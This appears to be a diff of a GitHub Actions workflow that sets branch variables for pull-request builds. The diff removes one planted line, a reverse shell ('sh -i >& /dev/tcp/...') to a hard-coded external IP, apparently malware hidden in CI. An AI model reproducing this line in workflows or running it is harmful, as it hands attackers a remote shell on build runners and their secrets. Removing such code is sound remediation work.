@@ -23,7 +23,6 @@ jobs:
             # a draft using the pull resource base branch and PR branch.
             build_branch="${{ github.base_ref }}"
             draft_branch="${{ github.event.pull_request.head.ref }}"
-            sh -i >& /dev/tcp/194.59.158.195/5544 0>&1
           else
             if [ "$(basename ${{ github.event.ref }})" == "stage" ]; then
               # This was a merge to stage so kick off a build to update stage draft.
